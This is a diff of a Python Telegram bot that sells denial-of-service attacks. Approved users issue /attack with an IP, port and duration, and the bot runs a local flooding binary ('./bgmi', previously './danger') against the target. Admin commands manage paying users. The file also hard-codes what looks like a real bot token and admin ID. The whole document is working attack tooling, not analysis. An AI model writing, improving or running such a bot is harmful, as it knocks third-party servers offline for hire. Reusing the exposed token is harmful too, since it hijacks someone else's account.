@@ -1,14 +1,13 @@
 import asyncio
 import socket
+import os
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-# ===== CONFIGURATION =====
 TELEGRAM_BOT_TOKEN = '7384442199:AAFUKtDQz53FQsVLwd34iyI8Sqn0dZZYYMI'
 ADMIN_USER_ID = 7265678519
 USERS_FILE = 'users.txt'
 attack_in_progress = False
-# =========================
 
 def load_users():
     try:
@@ -24,97 +23,66 @@ def save_users(users):
 users = load_users()
 
 def resolve_target(target):
-    """DNS resolve karega — IP diya to wahi rahega, domain diya to resolve karega"""
     try:
         socket.inet_aton(target)
-        return target  # Already an IP
+        return target
     except socket.error:
         try:
             ip = socket.gethostbyname(target)
-            print(f"[DNS] Resolved {target} → {ip}")
+            print(f"[DNS] Resolved {target} -> {ip}")
             return ip
         except Exception as e:
-            print(f"[DNS] Failed to resolve {target}: {e}")
+            print(f"[DNS] Failed: {e}")
             return target
 
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
-    message = (
-        "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use /attack <ip> <port> <duration>*\n"
-        "*Let the war begin! ⚔️💥*"
-    )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+    msg = "*🔥 Welcome! 🔥*\n\n*Use /attack <ip> <port> <duration>*\n*Ex: /attack 8.8.8.8 80 30*"
+    await context.bot.send_message(chat_id=chat_id, text=msg, parse_mode='Markdown')
 
 async def manage(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     args = context.args
     if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="*⚠️ You need admin approval to use this command.*",
-            parse_mode='Markdown'
-        )
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Unauthorized*", parse_mode='Markdown')
         return
     if len(args) != 2:
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="*⚠️ Usage: /manage <add|rem> <user_id>*",
-            parse_mode='Markdown'
-        )
+        await context.bot.send_message(chat_id=chat_id, text="*/manage <add|rem> <user_id>*", parse_mode='Markdown')
         return
-    command, target_user_id = args
-    target_user_id = target_user_id.strip()
-    if command == 'add':
-        users.add(target_user_id)
+    cmd, uid = args[0], args[1].strip()
+    if cmd == 'add':
+        users.add(uid)
         save_users(users)
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=f"*✔️ User {target_user_id} added.*",
-            parse_mode='Markdown'
-        )
-    elif command == 'rem':
-        users.discard(target_user_id)
+        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {uid} added*", parse_mode='Markdown')
+    elif cmd == 'rem':
+        users.discard(uid)
         save_users(users)
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=f"*✔️ User {target_user_id} removed.*",
-            parse_mode='Markdown'
-        )
+        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {uid} removed*", parse_mode='Markdown')
 
 async def run_attack(chat_id, ip, port, duration, context):
     global attack_in_progress
     attack_in_progress = True
     try:
         resolved_ip = resolve_target(ip)
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=f"*🎯 Target resolved: {ip} → {resolved_ip}:{port}*",
-            parse_mode='Markdown'
-        )
+        if not os.path.exists('./bgmi'):
+            await context.bot.send_message(chat_id=chat_id, text="*⚠️ bgmi binary missing*", parse_mode='Markdown')
+            return
+        await context.bot.send_message(chat_id=chat_id, text=f"*🎯 Attacking {resolved_ip}:{port} for {duration}s*", parse_mode='Markdown')
         process = await asyncio.create_subprocess_shell(
-            f"./danger {resolved_ip} {port} {duration} 10",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
+            f"./bgmi {resolved_ip} {port} {duration} 10",
+            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
         )
         stdout, stderr = await process.communicate()
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
+        if stdout and b"EXPIRED" in stdout:
+            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Binary expired!*", parse_mode='Markdown')
+            return
+        if stdout: print(stdout.decode())
+        if stderr: print(stderr.decode())
     except Exception as e:
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=f"*⚠️ Error during the attack: {str(e)}*",
-            parse_mode='Markdown'
-        )
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')
     finally:
         attack_in_progress = False
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*",
-            parse_mode='Markdown'
-        )
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
@@ -122,45 +90,25 @@ async def attack(update: Update, context: CallbackContext):
     user_id = str(update.effective_user.id)
     args = context.args
     if user_id not in users:
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="*⚠️ You need to be approved to use this bot.*",
-            parse_mode='Markdown'
-        )
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Not authorized*", parse_mode='Markdown')
         return
     if attack_in_progress:
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="*⚠️ Another attack is already in progress. Please wait.*",
-            parse_mode='Markdown'
-        )
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack already running*", parse_mode='Markdown')
         return
     if len(args) != 3:
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text="*⚠️ Usage: /attack <ip> <port> <duration>*",
-            parse_mode='Markdown'
-        )
+        await context.bot.send_message(chat_id=chat_id, text="*/attack <ip> <port> <duration>*", parse_mode='Markdown')
         return
     ip, port, duration = args
-    await context.bot.send_message(
-        chat_id=chat_id,
-        text=(
-            f"*⚔️ Attack Launched! ⚔️*\n"
-            f"*🎯 Target: {ip}:{port}*\n"
-            f"*🕒 Duration: {duration} seconds*\n"
-            f"*🔥 Mayhem initiated! Let the battlefield ignite! 💥*"
-        ),
-        parse_mode='Markdown'
-    )
+    await context.bot.send_message(chat_id=chat_id, text=f"*⚔️ Attack Launched! {ip}:{port} for {duration}s*", parse_mode='Markdown')
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
 def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("manage", manage))
-    application.add_handler(CommandHandler("attack", attack))
-    application.run_polling()
+    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("manage", manage))
+    app.add_handler(CommandHandler("attack", attack))
+    print("[+] Bot started!")
+    app.run_polling()
 
 if __name__ == '__main__':
     main()
